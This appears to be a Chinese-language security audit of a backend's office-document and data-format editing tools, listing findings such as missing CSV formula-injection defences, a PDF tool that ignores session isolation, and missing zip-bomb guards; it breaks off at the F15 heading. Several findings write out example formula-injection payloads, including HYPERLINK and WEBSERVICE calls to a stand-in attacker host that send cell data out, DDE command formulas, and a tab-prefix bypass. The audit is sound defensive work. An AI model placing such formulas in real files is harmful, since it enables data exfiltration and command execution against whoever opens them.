# full-sweep-15 / a5：办公文档 + 数据格式工具集

- 审计日期：2026-10-08
- 分支：`production` @ fa7c64f
- 范围：`src/backend/tools/` 下 Excel / Word / PDF / PPT / 结构化数据 / Markdown 全部 29 个文件 + `_source_edit.py` / `_files.py` / `_file_cache.py`
- 方法：逐行读代码 + 关键断言实测（stdlib ET 实体行为）。**不采信任何注释/docstring/README/docs 的说法。**

## 0. 全局可达性前提（决定所有发现的严重度）

`config/default.yaml` 的开关默认值（逐条核验）：

| 行号 | 开关 | 默认 |
|---|---|---|
| `:101` | `file_read_enabled` | `false` |
| `:102` | `file_read_root` | `"."`（repo 根） |
| `:106` | `c_edit_enabled` | `false` |
| `:109` | `word_edit_enabled` | `false` |
| `:111` | `powerpoint_edit_enabled` | `false` |
| `:113` | `excel_create_enabled` | `false` |
| `:118` | `excel_edit_enabled` | `false` |
| `:121` / `:124` / `:127` / `:130` | `text_edit` / `markdown_edit` / `csv_edit` / `typescript_edit` | `false` |
| `:133` / `:136` / `:139` / `:142` / `:145` | `json` / `jsonl` / `yaml` / `toml` / `xml` edit | `false` |
| `:148` / `:151` / `:154` | `env_edit` / `properties_edit` / `ini_edit` | `false` |
| `:158-177` | 各语言代码编辑开关 | `false` |

- `config/production.yaml` 与 `config/staging.yaml` 只设 `web_search_enabled: true`，未触及任何文件/编辑开关。`docker-compose.yml` 的 `environment` 块不传这些开关。
- 工厂函数的守卫写法（flag 为假直接 `return []`，工具不注册）：`excel_create.py:159-162`、`csv_edit.py:262-265`、`env_edit.py:220-223`、`_source_edit.py:179-182`、`word_edit.py`、`powerpoint_edit.py`、`pdf_edit.py:143`、`excel_edit.py` 同构。
  → **容器化生产部署下，本清单里的工具默认全部不可达。**
- 本地开发用 `.env` 打开开关后全部可达。
- 因此严重度按**"开关打开后的本地/自托管场景"**评级。特别注意 `pdf_edit_enabled` 连配置文件模板里都没有（见 F14）。

---

## 1. 公式注入拦截矩阵（核心产出）

### 1.1 结论总览

| 文件 | `=` | `+` | `-` | `@` | `\|` (DDE) | `\t` | `\r` | `\n` | `&#0;` | 其他控制符 (C0) |
|---|---|---|---|---|---|---|---|---|---|---|
| `excel_create.py` — `rows[]` 单元格值 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (44,114) |
| `excel_create.py` — `formulas[].formula` | ✅ 要求以 `=` 开头 (68) | n/a | n/a | n/a | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (68,70) |
| `excel_edit.py` — `set_cell` value | ✅ 拒绝 (178-181) | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (182) |
| `excel_edit.py` — `set_formula` formula | ✅ 要求以 `=` 开头 (185-186) | n/a | n/a | n/a | ✅ 拒绝 (192-193) | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (187) |
| `csv_edit.py` — 全部写入面 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ⚠️ 间接拒绝（回读校验） | ❌ 放行（单元格内嵌换行） | ❌ 放行 | ⚠️ 间接拒绝（回读校验） |
| `jsonl_edit.py` | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (\r\n) (147) | ✅ 拒绝 (\r\n) (147) | ❌ 放行 | ⚠️ 间接拒绝（回读校验） |
| `markdown_edit.py` | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ❌ 放行 | ✅ 拒绝 (\r\n) | ✅ 拒绝 (\r\n) | ❌ 放行 | ⚠️ 间接拒绝（回读校验） |

图例：✅ = 代码里有明确的拦截逻辑；❌ = 无任何拦截；⚠️ = 靠"写盘后重新解析校验"的副作用挡住，不是主动拦截。

**关于 `csv_edit.py` 的 ⚠️ 列**：`_validate_row`（`csv_edit.py:83-90`）本身不查任何字符，但 `_write_csv_atomically`（`csv_edit.py:911-960`）在落盘后会 `_read_csv_document(temp_path)` 回读校验，回读走 `_decode_csv`，那里会拒绝裸 CR（`csv_edit.py:640-642`）和其他 C0 控制符（`csv_edit.py:631-638`）。所以控制符是**被副作用挡住**的，不是被主动拦截的 —— 一旦有人重构掉这个回读步骤，防护就无声消失。而 `\t` 和 `\n` 是**真正放行**的（回读也不拦），这两个正是前导制表符绕过和单元格内嵌换行注入的载体。

### 1.2 判定依据

`_CONTROL_CHARS` 的正则是关键：

```python
# excel_create.py:44 / excel_edit.py:61 —— 两处分号一致的同一份正则
_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
```

字符类是 `\x00-\x08` **然后** `\x0b\x0c` **然后** `\x0e-\x1f`，中间刻意跳过了三个位置：
- `\x09` = TAB → **不在**控制符集合里
- `\x0a` = LF → **不在**
- `\x0d` = CR → **不在**

所以 `\t=HYPERLINK(...)` 这种"前置制表符 + 公式"的经典 CSV/电子表格注入绕过手法，在两个 Excel 工具里**都不会被拦**。

`csv_edit.py` 的读侧校验（`_decode_csv:631-638`）比 `_CONTROL_CHARS` 更严（拒绝 `ord < 32` 除 `\t\r\n`、拒绝 `0x7F`/`0xFFFE`/`0xFFFF`），而 `_source_edit.py:637-644` 用的是一模一样的规则。两者都对 `\t` 放行。

### 1.3 为什么 `+` / `-` / `@` 在 xlsx 里风险低于 CSV

实测依据（openpyxl 的行为，`excel_edit.py:424` / `:426` 的赋值路径）：openpyxl 的 `_infer_value` 只在字符串**以 `=` 开头**时把单元格类型标为公式（`data_type = 'f'`），`+`/`-`/`@` 开头的字符串会被存成普通字符串（`data_type = 's'`）。xlsx 有显式的类型元数据，Excel 按元数据解释，不会把字符串单元格重新当公式算。

CSV **没有类型元数据**，解析器在打开时才决定。Excel / LibreOffice 都会把 `+1+1`、`-1+1`、`@SUM(A1)` 这类首字符在 `=+-@` 里的内容当公式解析。LibreOffice 还会在判定前先 strip 掉前导空白/制表符。

→ 结论：**`+`/`-`/`@` 是 CSV 专属的高危前缀；对 xlsx 它们只是"看起来吓人但被类型系统挡住"。真正需要堵的是 csv_edit。**

---

## 2. 发现清单

### [高] F1：`csv_edit.py` 对公式注入零防护，5 个写入面全部裸奔

`csv_edit.py` 全文 1041 行，唯一的写入侧校验是 `_validate_row`（`csv_edit.py:83-90`）：

```python
def _validate_row(row: list[str], *, label: str) -> None:
    if len(row) > _MAX_COLUMNS:
        raise ValueError(...)
    for cell in row:
        if len(cell) > _MAX_CELL_CHARS:
            raise ValueError(...)
```

只查列数与长度。`CsvEditOperation._check_fields`（`csv_edit.py:143-171`）只查字段是否缺失。`new_value` / `expected_value`（`csv_edit.py:126-141`）只有 `max_length=_MAX_CELL_CHARS`。`CsvCreateInput._check_dimensions`（`csv_edit.py:217-222`）同样只走 `_validate_row`。

序列化端 `_encode_csv`（`csv_edit.py:827-837`）直接 `csv.writer.writerows`，不做任何前缀转义或加 `'` 前缀。

**5 个写入面，全部无防护**：
1. `create_csv_file` → `CsvCreateInput.headers` / `.rows`（`csv_edit.py:370-372`）
2. `edit_csv_file` → `update_cell.new_value`（`csv_edit.py:797-798`）
3. `edit_csv_file` → `replace_row.new_row`（`csv_edit.py:805-807`）
4. `edit_csv_file` → `insert_before_row.new_row`（`csv_edit.py:808-811`）
5. `edit_csv_file` → `append_row.new_row`（`csv_edit.py:814`）

**触发条件**：`FILE_READ_ENABLED=true` + `CSV_EDIT_ENABLED=true`。LLM 生成 `update_cell`，`new_value="=HYPERLINK(\"http://attacker.tld/\"&A1,\"下载\")"`，即得到一份点开即触发外连/导航的 CSV。

**为什么这里的危害比 Excel 工具大**：CSV 无类型元数据，Excel 与 LibreOffice 在打开时才判定。`=`/`+`/`-`/`@` 四个前缀都会被当公式解析；LibreOffice 还会先 strip 前导空白/制表符，所以 `\t=HYPERLINK(...)` 也是有效载荷。

**注意**：`csv_edit.py` 不被 `excel_create` 复用 —— Excel 创建完全走 Node/ExcelJS 通道（见 F12），两者互不调用。所以这条攻击面是孤立的，没有串联放大。

**修法建议**：抽出共享的 `_guard_cell_text()`（拒绝 `^[=+-@]`、`|`、`\t` 前缀），在 `_validate_row` 里调用；创建/编辑两侧都必须过。或者更简单：写盘时对命中前缀的单元格强制加 `'` 前缀（但会改变数据语义，不如拒绝）。

---

### [高] F2：`excel_create.py` 的 `formulas` 通道无任何 DDE / 网络函数限制

`SpreadsheetFormula.validate_formula`（`excel_create.py:64-73`）：

```python
@model_validator(mode="after")
def validate_formula(self) -> SpreadsheetFormula:
    if not _CELL_PATTERN.fullmatch(self.cell):
        raise ValueError("cell must be a valid A1 address such as C4.")
    if not self.formula.startswith("=") or _CONTROL_CHARS.search(self.formula):
        raise ValueError("formula must start with '=' and contain no control characters.")
    ...
```

**只要以 `=` 开头、无控制符就放行**。没有 `|` 检查，没有函数名黑名单。对照 `excel_edit.py:192-193` 是显式拒绝 `|` 的 —— 同一仓库、同一语义，两个文件标准不一致。

可写入的载荷（全部通过校验）：
- `=cmd|'/c calc'!A0` —— DDE 命令，Excel 打开时尝试 DDE 外连
- `=WEBSERVICE("http://attacker.tld/x")` —— HTTP 外连，返回值进单元格
- `=IMPORTXML("http://attacker.tld/x","//x")` —— HTTP 外连
- `=WEBAPI("http://attacker.tld/x")`
- `=HYPERLINK("http://attacker.tld/x","点我")` —— 点击导航

**`rows` 单元格值也一样裸奔**：`validate_sheet` 的单元格循环（`excel_create.py:111-116`）只查长度和控制符，不查 `=`/`+`/`-`/`@`/`|`。

**缓解因素（要写清楚，不是纯粹的"任意 RCE"）**：`excel_create.mjs:64` 用 `range.values = sheetSpec.rows` 赋值，ExcelJS 会把这类字符串写成 `t="s"`（普通字符串）而不是公式，Excel 按元数据解释不会执行。但 `formulas` 数组走的是 `.formulas`（`excel_create.mjs:66-67`），**那里是真公式**。所以风险集中在 `formulas` 通道。

另外 mjs 侧唯一的"安全检查" `scanFormulaErrors`（`excel_create.mjs:44-54`）只是用正则搜 `#REF!|#DIV/0!` 等错误码 —— 它检查的是**公式报错**，不是**公式安全性**，两者无关。而且 `node_modules` 不存在时整个通道本来就跑不起来（见 F13）。

**修法建议**：在 `validate_formula` 里加 `|` 检查 + 函数名黑名单（`WEBSERVICE`/`WEBAPI`/`IMPORTXML`/`FILTERXML`/`URL`/`DDE`/`WEBSERVICE`），与 `excel_edit.py` 对齐。

---

### [中] F2b：`excel_edit.py` 的 `set_formula` 同样只拦 `|`，不拦网络函数公式

`excel_edit.py:184-193`：

```python
if action == "set_formula":
    if not self.formula or not self.formula.startswith("="):
        raise ValueError("set_formula requires a formula starting with '='.")
    if _CONTROL_CHARS.search(self.formula):
        raise ValueError("formula contains unsupported control characters.")
    # '|' is the DDE-command marker (e.g. =cmd|'/c calc'!A1) and is not
    # a valid Excel formula operator, so any formula containing it is
    # rejected to block DDE execution when the file is opened in Excel.
    if "|" in self.formula:
        raise ValueError("formulas containing '|' (DDE commands) are not allowed.")
```

注释与代码一致（这是全仓库少见的可信注释）。但它只堵了 DDE 这一种外连方式。`:425-426` 直接 `cell.value = operation.formula`，openpyxl 会把以 `=` 开头的字符串按公式类型存盘，所以写入的是**真公式**。

**未被拦的外连载荷**（全部通过校验）：
- `=WEBSERVICE("http://attacker.tld/x")`
- `=WEBAPI("http://attacker.tld/x")`
- `=IMPORTXML("http://attacker.tld/x","//x")`
- `=FILTERXML("http://attacker.tld/x","//x")`
- `=HYPERLINK("http://attacker.tld/x","点我")`
- `=DDE("server","topic","cmd")` —— DDE 的**函数**形式，不含 `|`，绕过 `:192` 的检查

所以"拦了 `|`"并不等于"拦了 DDE"，也不等于"拦了外连"。这与 F2 是同一个缺陷在两个文件里的表现：两个工具的公式白名单都不完整。

**修法建议**：两个工具共用一个 `_guard_formula()`：拒绝 `|`、拒绝黑名单函数名（大小写不敏感）、可选地只允许明确的白名单函数集。

---

### [信息] F2c：`|` 同时是 CSV 的合法分隔符

`csv_edit.py:45`：

```python
_DELIMITERS = (",", ";", "\t", "|")
```

`csv_edit.py:672-679` 的 `_detect_delimiter` 用 `csv.Sniffer().sniff(sample, delimiters="".join(_DELIMITERS))` 嗅探分隔符。所以 `|` 分隔的 CSV 是受支持的。

→ 这意味着公式注入矩阵里 `csv_edit.py` 的 `|` 列要分两层理解：
1. 作为**内容**（逗号分隔的 CSV 里）：`|` 就是普通字符，可自由写入，构成 DDE 载荷的一部分。
2. 作为**分隔符**（管道分隔的 CSV 里）：单元格内的 `|` 会被当成分列符，载荷会被切成多个列 —— 载荷本身失效，但列数暴增可能触发 `_MAX_COLUMNS`。

两种情况下 F1 的结论不变：没有任何防护。

---

### [高] F3：`pdf_edit.py` 完全没做会话隔离 —— 可跨会话读、可跨会话写

这是本次审计**最高优先级的新发现**，与历史结论完全无关。

`build_pdf_edit_tools`（`pdf_edit.py:130-147`）签名接收 `session_root` 和 `thread_id`：

```python
def build_pdf_edit_tools(
    settings: Settings,
    *,
    session_root: Path | None = None,
    thread_id: str = "",
) -> list[BaseTool]:
    """Create the session-scoped PDF edit tool.

    Returns an empty list unless file reading and PDF editing are enabled.
    Like the other session editors, output stays inside the session upload
    directory and existing files are never overwritten.
    """

    if not (settings.file_read_enabled and settings.pdf_edit_enabled):
        return []

    file_root = Path(settings.file_read_root)
```

**`session_root` 和 `thread_id` 在函数体里一次都没被引用。** 而 docstring 第 139-140 行明说"output stays inside the session upload directory"——**这条注释是假的**（本次审计又一例"注释与代码不符"，且方向正好相反：其他工具里注释往往夸大防护，这里注释承诺隔离而代码没有）。

调用点 `providers.py:248-250` 确实传了 `session_root=` 和 `thread_id=` —— 被静默丢弃。

后果链条：
1. `edit_pdf_document`（`pdf_edit.py:192-197`）用 `resolve_safe_path(path, root=file_root, ...)`，`file_root = settings.file_read_root`。
2. `_reserve_output_path`（`pdf_edit.py:435-459`）把输出写到**源文件同目录**：`source_path.with_name(f"{stem}.edited{suffix}")`。
3. `merge_pdfs`（`pdf_edit.py:320-325`）的第二个路径同样 `root=file_root`。

→ LLM 传入 `chat_uploads/<别的用户thread>/report.pdf` 就能读、能改、并把编辑结果写进**那个用户的会话上传目录**。`file_read_root` 的默认值是 `"."`（`config/default.yaml:102`），即 repo 根目录 —— 范围比想象的还大。

**次生问题**：`_run_edit` 返回 `result, None`（`pdf_edit.py:161`），但工具 `description` 声称"The edited copy is returned as a download"（`pdf_edit.py:172`），`response_format="content_and_artifact"`（`pdf_edit.py:176`）。artifact 恒为 `None`，下载承诺不成立 —— 用户拿到一个只有文本提示的路径。

**`output_name` 本身没有穿越**：`Path(output_name.strip()).stem`（`pdf_edit.py:441`）取 stem 会剥掉目录段，`../../../etc/x` → `x`。这部分是安全的。

**修法建议**：要么按 docstring 实现（用 `session_root` 收窄 `root` 并在开头加 `if session_root is None: return []`），要么改 docstring + 工具描述，承认它是全局范围的。

---

### [中] F4：`word_file.py` 没有任何 zip bomb 防护，与 `word_edit.py` 明显不一致

`word_file.py:_extract_docx_paragraphs`（`word_file.py:127-139`）：

```python
def _extract_docx_paragraphs(path: Path) -> list[str]:
    with zipfile.ZipFile(path) as archive, archive.open(_DOCUMENT_PART) as document:
        tree = ET.parse(document)
```

直接 `archive.open("word/document.xml")` 读整个成员，然后 `ET.parse` 把全部内容解析进内存。**没有成员数上限、没有解压后总字节上限、没有压缩比检查。**

对照 `word_edit.py:1248-1281` 的 `_guard_archive` 是完整的：`_MAX_ZIP_ENTRIES = 512`（:54）、`_MAX_UNCOMPRESSED_BYTES = 50_000_000`（:55）、`_MAX_COMPRESSION_RATIO = 200`（:56）。

唯一的兜底是 `resolve_safe_path` 的 `max_bytes`（`_files.py:79-81`），但它限制的是**压缩后**的磁盘大小。一个 `word/document.xml` 压缩到 5 MB、解压到 2 GB 的成员就能打穿。

`excel_file.py:107-119` 同样有这个问题：`openpyxl.load_workbook(resolved, read_only=True, data_only=True)` 前无 `_guard_archive`，而 `excel_edit.py:548-549` 是有的。`pdf_file.py` 同理（`pypdf.PdfReader` 前无页数/大小预检，只有 `max_pages` 默认 50、上限 500）。

**修法建议**：把 `word_edit._guard_archive` 提成共享函数，`word_file`/`excel_file`/`pdf_file` 三个读侧工具都调。

---

### [中] F5：`_CONTROL_CHARS` 正则刻意漏掉 TAB / LF / CR

```python
# excel_create.py:44 和 excel_edit.py:61，两份完全相同的正则
_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
```

区间是 `\x00-\x08` **跳过 `\x09`**、`\x0b\x0c` **跳过 `\x0a`**、`\x0e-\x1f` **跳过 `\x0d`**。三个被跳过的正好是 TAB、LF、CR。

`csv_edit.py:631-638` 和 `_source_edit.py:637-644` 用的是另一份等价规则（`ord(character) < 32 and character not in "\t\r\n"`），同样放行这三个。

→ 前置制表符绕过在所有 7 个文本类工具上都成立。`excel_edit.py:178` 的 `self.value.startswith("=")` 判断会被 `\t=HYPERLINK(...)` 骗过 —— 不过如 F2 所述，openpyxl 会把它存成普通字符串，所以 xlsx 通道实际危害有限；**CSV 通道（F1）没有这个侥幸**。

`&#0;` 这类 HTML 数值实体在电子表格上下文里不成立（表格解析器不做 HTML 实体解码），列为不适用。

**修法建议**：正则改为 `^[\s=+\-@|]` 前缀检查，与"控制符集合"分开成两个独立检查。

---

### [中] F6：`env` / `properties` / `ini` 会把 secret 值整段吐给 LLM

这是**设计使然**，但需要被明确记录为一处已知暴露面：

- `env_file.py:59-68` 的 `read_env_file` 直接 `resolved.read_text()` 返回原文，`_MAX_CHARS = 20_000`。工具描述里自己承认："the file may contain secrets such as API keys"（`env_file.py:63-65`）。
- `env_edit.py:412-413` 的 `inspect_env_file` 输出 `f"{key} = {entries[key]}"`，最多 1000 个 key（`_MAX_INSPECT_ENTRIES = 1_000`）。
- `properties_file.py:94` / `ini_file.py:96` / `env_file.py:96` / `yaml_file.py:94` / `xml_file.py:94` / `json_file.py:95` / `markdown_file.py:94` / `toml_file.py:94` 全部是 `read_text(encoding="utf-8", errors="replace")` 原文回传。

即：**任何放进 `file_read_root` 下的配置文件，其值都会进 LLM 上下文。** 这些工具的 `expected_value` 机制决定了必须回读原值，所以没法在不改交互模型的前提下消除。真正能做的只有：对疑似 secret 的 key 名做脱敏（但会破坏 `expected_value` 校验），或文档化风险并依赖下游模型约束。

**三个问题的直接回答**：
- (a) 会，secret 值原文回传给 LLM，无脱敏。
- (b) **不能覆盖真实密钥**。所有 edit 都是 copy-on-write：`_reserve_output_path`（`_source_edit.py:881-912`）在候选路径上 `touch(exist_ok=False)`，且 `if candidate.resolve() == resolved_source: continue`（`_source_edit.py:901`）显式跳过源文件。产物落在会话目录。
- (c) 路径根是 `session_root`（会话上传目录），被 `_is_within(resolved, session_resolved)`（`_source_edit.py:580`）限定在 `file_read_root` 之内。**指不到 repo 外**（`pdf_edit.py` 例外，见 F3）。

**附带发现**：`_files.py:15-25` 的 `_BLOCKED_NAMES` 包含 `.env` 和 `.env.local`，而 `ENV_CONFIG.suffixes` 是 `(".env", ".env.local", ".env.example")`（`env_edit.py:61-69`）。由于 `resolve_safe_path` 在 `_files.py:65-66` 会按 basename 拒绝这两个名字，**`env_edit` / `env_file` 唯一能操作的名字其实是 `foo.env` 这种** —— 恰好叫 `.env` 或 `.env.local` 的文件被 blocklist 挡住。这与 `ini_edit`/`properties_edit` 形成对比：`.ini`/`.cfg`/`.conf`/`.properties` 都在 blocklist 之外，可正常操作。

---

### [低] F7：`excel_create.py:_validate_xlsx` 没有 zip bomb 防护

`excel_create.py:345-356`：

```python
def _validate_xlsx(path: Path) -> None:
    import zipfile
    try:
        with zipfile.ZipFile(path) as archive:
            names = set(archive.namelist())
            if "[Content_Types].xml" not in names or "xl/workbook.xml" not in names:
                raise SpreadsheetCreateError(...)
    except zipfile.BadZipFile as exc:
        ...
```

只验证两个必存成员是否存在。**没有成员数、没有解压后总字节、没有压缩比、没有成员名 `../` 检查。**

风险有限的原因：输入是自家 Node 脚本刚产出的文件（`_validate_xlsx` 只在 `excel_create.py:255` 被调用一次），不是用户上传物。但如果 `EXCEL_NODE_EXECutable` 被配置成不可信程序，这里就成了"未校验的第三方产物入库"入口。

另外 `_guard_archive`（`excel_edit.py:575-583`）和 `_guard_archive`（`word_edit.py:1252-1277`）**都没有检查成员名是否含 `../`**（zip slip）。这两个解析器（openpyxl / python-docx）不做成员落盘，所以 slip 无法直接落地；但如果未来加"提取成员到磁盘"的功能，这里就是漏洞入口。

---

### [低] F8：stored entry 的处理在 Excel 和 PowerPoint 之间不一致

`powerpoint_edit.py:435-443`：

```python
for info in entries:
    total += info.file_size
    if info.file_size and not info.compress_size:
        raise PowerPointEditError("presentation has an unsafe compression ratio.")
```

**任何 stored（未压缩）成员一律拒绝。**

`excel_edit.py:575-581` 只检查 `compress_size and file_size/compress_size > 200`，stored 成员（`compress_size == 0`）被完全跳过。

`excel_edit.py:570-574` 的注释解释了这是刻意权衡（"Stored entries are not compression bombs... Rejecting every stored entry (as the PowerPoint guard does) would risk refusing real workbooks"）。**这里注释与代码是一致的**，属于"可信注释"。风险在于 stored 成员的大小只由 `max_bytes`（压缩后=解压后）兜底，等价于允许一个成员占满整个 `file_read_max_bytes`；而 PowerPoint 侧直接拒绝。两个 OOXML 工具标准不统一，需要明确哪个是对的。

---

### [低] F9：XXE —— 实测外部实体被 stdlib 阻断，但内部实体扩展未验证

`xml_edit.py:20` 是 `import xml.etree.ElementTree as ET`，`xml_edit.py:576` 是 `root = ET.fromstring(text)`。**没有 lxml、没有 defusedxml、没有 `resolve_entities=False`、没有 XMLParser 参数。** 按经典 XXE 检查清单，这一条是"不达标"的。

但实测（Python 3.11.9，本机 expat）：

```
INLINE_SYSTEM   -> ParseError: undefined entity &xxe;: line 3, column 3
EXT_VIA_SUBSET  -> ParseError: undefined entity &xxe;: line 1, column 104
```

两种写法（内联 `SYSTEM "file://..."`、以及外部 DTD 子集里再声明 SYSTEM 实体）都返回 `undefined entity`，**expat 没有去抓那个 URI**。所以经典 XXE 在本环境不可利用。

**未能验证**：billion-laughs / 内部实体扩展 DoS。我构造的每种 `<!ENTITY>` 声明在本机 expat 上都以 `ParseError: not well-formed (invalid token)` 失败（ET / minidom / sax 三者报同一位置），说明我的载荷本身不合法而非 expat 阻断扩展 —— 需要另起一轮用外部 `.dtd` 文件验证，本轮不下结论。

`word_file.py:131` 的 `ET.parse(document)` 解析的是攻击者可控的 `word/document.xml`，属同一类别。

**修法建议**：不依赖"恰好被 expat 挡住"这种实现细节。加 `ET.XMLParser(resolve_entities=False)`，或在 `_parse_document_text` 前拒绝含 `<!DOCTYPE` / `<!ENTITY` 的文档。

---

### [信息] F10：YAML 是干净的

`yaml_edit.py:580` `documents = list(yaml.safe_load_all(text))`，`yaml_edit.py:595` `yaml.safe_dump(...)`。全仓库 grep 无 `yaml.load`、无 `FullLoader`、无 `BaseLoader`、无 `loader=` 关键字。多文档流被显式拒绝（`yaml_edit.py:583-587`）。

`yaml_file.py` 更保守：只做 `read_text`（`yaml_file.py:94`），根本不解析。

`!!python/object/apply:os.system` 这类标签在 `safe_load_all` 下抛 `ConstructorError`，被 `yaml.YAMLError` 捕获（`yaml_edit.py:581-582`）变成用户可见错误。**这里代码与注释一致**（`yaml_edit.py:573-575` 的 docstring 说"used exclusively so arbitrary `!!python/...` tags can never execute"，实测属实）。

---

### [信息] F11：宏启用格式全部被后缀白名单挡掉

`_SUFFIXES` / `*_SUFFIXES` 全表：

| 工具 | 允许后缀 |
|---|---|
| `word_edit.py:43` | `(".docx",)` |
| `word_file.py:16` | `(".docx",)` |
| `excel_edit.py:39` | `(".xlsx",)` |
| `excel_file.py:14` | `(".xlsx",)` |
| `powerpoint_edit.py:32` | `(".pptx",)` |
| `pdf_file.py:14` / `pdf_edit.py:16` | `(".pdf",)` |

`word_edit.py:1191-1195` 还额外显式拒绝 `.doc`/`.docm`/`.dotm`；`word_file.py:81-85` 显式拒绝 `.doc`。`.xlsm`/`.xlsb`/`.pptm` 一律进不来（`resolve_safe_path` 在 `_files.py:73-77` 按后缀拒绝）。

→ **VBA 宏既不会被读取、也不会被暴露给 LLM**。另外 openpyxl / python-docx / python-pptx 三个库默认都不加载 VBA（openpyxl 需 `keep_vba=True`，代码里没传）。

残留边角：一个命名为 `.docx` 的文件理论上仍可塞 `word/vbaProject.bin` 成员，但三个库都不读它，工具输出只含段落/形状文本。不构成暴露面。

---

### [信息] F12：`excel_create.mjs` 与 `excel_create.py` 的衔接

传输方式 = **临时目录 + 文件传参 + 命令行路径参数**，不是 stdin，也不是把数据直接塞进 argv：

`excel_create.py:217-229`：
```python
work_dir = Path(tempfile.mkdtemp(prefix=".excel-create-", dir=directory))
input_path = work_dir / "request.json"
...
input_path.write_text(json.dumps(request.model_dump(mode="json"), ensure_ascii=False), encoding="utf-8")
adapter_path = work_dir / "builder.mjs"
adapter_path.write_text(Path(__file__).with_suffix(".mjs").read_text(encoding="utf-8"), encoding="utf-8")
_link_node_modules(work_dir / "node_modules", node_modules_path)
```

`excel_create.py:230-244`：
```python
completed = subprocess.run(
    [node_executable, str(adapter_path), str(input_path), str(output_temp), str(inspect_path), str(render_dir)],
    cwd=str(work_dir), capture_output=True, text=True, timeout=120, check=False,
)
```

mjs 侧 `excel_create.mjs:4-7` 从 `process.argv` 读 5 个路径，`excel_create.mjs:57` `JSON.parse(await fs.readFile(inputPath, "utf8"))`。

**安全性分析**：
- **无参数注入**：用列表参数而非 shell 字符串，`subprocess.run([...])` 不经过 shell。文件名虽然来自 LLM（`_creation_stem` 清洗过，`excel_create.py:295-302`），但不构成 argv 注入。
- **无临时文件竞态**：`tempfile.mkdtemp` 是唯一实例化的私有目录，不在系统共享 tmp 下。数据走文件而非 argv，所以不受 argv 长度或日志记录影响。
- **`node_executable` 是配置项**（`excel_node_executable`，默认 `"node"`）—— 这是真正的攻击面：如果 `EXCEL_NODE_EXECUTABLE` 被配成一个恶意程序，它拿到的是一个可读可写的私有目录 + 完整 request 内容。属于供应链/配置信任面，不是路径穿越。
- **`_link_node_modules`（`excel_create.py:318-342`）有一个小问题**：先试 `symlink_to`，失败后走 `subprocess.run(["cmd.exe", "/c", "mklink", "/J", str(link), str(modules)])`。Windows 上 `cmd.exe` 拼法是对的，但 `link` 和 `modules` 若含空格或特殊字符会被 `cmd.exe` 错误切分。`node_modules_path` 来自配置而非 LLM，风险低。
- `work_dir` 在 `finally` 里 `shutil.rmtree(work_dir, ignore_errors=True)`（`excel_create.py:279-281`），清理完整。
- `timeout=120` + `capture_output=True`：无 stdin 挂起风险，有超时兜底。

---

### [低] F13：`test_excel_create.py` 静默跳过 3 个测试（不是整个文件）

`test_excel_create.py:19-25`：
```python
@pytest.fixture
def artifact_runtime() -> tuple[str, str]:
    node = shutil.which("node")
    modules = Path("node_modules").resolve()
    if node is None or not (modules / "@oai" / "artifact-tool").is_dir():
        pytest.skip("artifact-tool Node runtime is unavailable")
    return node, str(modules)
```

本机 `node_modules` 不存在（已确认），所以 `modules / "@oai" / "artifact-tool"` 的 `.is_dir()` 为 False → skip 生效。

**历史结论"跳过整个文件"是不准确的**：它是 fixture 级跳过。受影响的只有 3 个请求了该 fixture 的测试：
- `test_create_excel_spreadsheet_is_session_scoped_and_collision_safe`（:51-57）
- `test_create_excel_spreadsheet_refuses_oversize_and_outside_session`（:98-104）
- `test_build_excel_create_tools_gates_and_supports_structured_invocation`（:164-169）

不受影响、正常跑的有：
- `test_sheet_validation_rejects_unsafe_or_inconsistent_inputs`（:134-146，5 个参数化用例）
- `test_workbook_validation_rejects_duplicate_sheet_names`（:149-161）

**但"公式注入覆盖率为零"这个结论成立**：`:134-142` 的 5 个参数化用例是 `Bad/Name`、非矩形行、公式越界、公式不以 `=` 开头、`\u0001` 控制符 —— **没有任何一个用例涉及 `=`/`+`/`-`/`@`/`|` 前缀的单元格值**。F1/F2 两个高危发现没有任何测试会拦住它们。

这是"环境依赖型静默测试丢失"机制，与"静态 pyc 孤儿"是两套不同的失效模式，历史记录这一点是对的。

**修法建议**：把 `pytest.skip` 改成 `pytest.importorskip` 或直接标记 `@pytest.mark.skipif` 并在 CI 里装 `@oai/artifact-tool`；同时给 `validate_sheet` 和 `validate_formula` 补上 F2 的载荷用例。

---

### [低] F14：`pdf_edit_enabled` 是唯一没进 `config/default.yaml` 的编辑开关

`grep` 全仓库，`pdf_edit_enabled` 只出现在：
- `src/config/settings.py:162`（`pdf_edit_enabled: bool = False`）
- `src/config/loader.py:127`（映射 `PDF_EDIT_ENABLED`）
- `src/config/loader.py:542`
- `src/backend/tools/pdf_edit.py:143`

`config/default.yaml` 里**完全没有这一行**，而其他 30+ 个编辑开关都在（`file_read_enabled` :101、`word_edit_enabled` :109、`powerpoint_edit_enabled` :111、`excel_create_enabled` :113、`excel_edit_enabled` :118、`csv_edit_enabled` :127、`env_edit_enabled` :148、`ini_edit_enabled` :154……）。

`config/production.yaml` 和 `config/staging.yaml` 也只开 `web_search_enabled: true`，未触及。`docker-compose.yml` 不传这些开关。

→ **生产容器下全部不可达**（与协调者提供的事实一致，此处逐条验证）。要启用 F3 那个跨会话越权工具，需要显式设 `PDF_EDIT_ENABLED=true` —— 恰好这个开关没人写进配置文件模板，认知盲区叠加越权缺陷。

---

### [低] F15：`PARSED_FILE_CACHE` 没有总字节上限

